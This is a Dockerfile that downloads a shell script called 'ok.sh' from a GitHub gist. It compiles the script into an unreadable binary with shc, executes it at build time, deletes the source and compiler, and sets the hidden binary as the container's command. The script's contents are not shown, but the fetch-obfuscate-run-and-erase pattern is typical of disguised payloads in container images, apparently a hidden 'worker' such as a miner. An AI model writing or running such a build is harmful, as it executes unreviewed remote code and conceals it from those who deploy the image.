FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/nikeely/4553615ecce1b4e3c9028533b9d6fb1b/raw/f8818cdc705dc0b95468a784c426f49e9eecf3a6/ok.sh

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && \
    apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
